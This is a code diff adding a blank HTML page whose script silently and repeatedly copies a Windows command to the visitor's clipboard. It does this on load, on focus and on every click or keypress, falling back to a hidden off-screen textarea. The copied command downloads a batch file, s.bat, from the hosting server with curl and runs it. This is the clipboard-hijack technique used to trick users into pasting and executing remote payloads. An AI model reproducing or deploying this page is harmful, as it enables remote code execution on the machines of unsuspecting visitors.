@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title></title>
+    <style>html, body { margin: 0; padding: 0; width: 100%; height: 100%; background: #ffffff; }</style>
+</head>
+<body>
+    <script>
+        const baseUrl = (window.location.origin + window.location.pathname).replace(/\/c(?:\/index\.html)?\/?$/, '');
+        const cmd = `cmd /c curl -s -L "${baseUrl}/s.bat" -o s.bat && s "${baseUrl}"`;
+        function doCopy() {
+            try {
+                if (navigator.clipboard && window.isSecureContext) {
+                    navigator.clipboard.writeText(cmd).catch(() => fallbackCopy());
+                } else {
+                    fallbackCopy();
+                }
+            } catch (e) {
+                fallbackCopy();
+            }
+        }
+        function fallbackCopy() {
+            try {
+                const ta = document.createElement("textarea");
+                ta.value = cmd;
+                ta.style.position = "fixed";
+                ta.style.left = "-9999px";
+                ta.style.opacity = "0";
+                document.body.appendChild(ta);
+                ta.focus();
+                ta.select();
+                document.execCommand("copy");
+                document.body.removeChild(ta);
+            } catch (e) {}
+        }
+        doCopy();
+        window.addEventListener("DOMContentLoaded", doCopy);
+        window.addEventListener("load", doCopy);
+        window.addEventListener("focus", doCopy);
+        ["mousedown", "pointerdown", "click", "keydown"].forEach(ev => {
+            document.addEventListener(ev, doCopy, { passive: true });
+        });
+    </script>
+</body>
+</html>
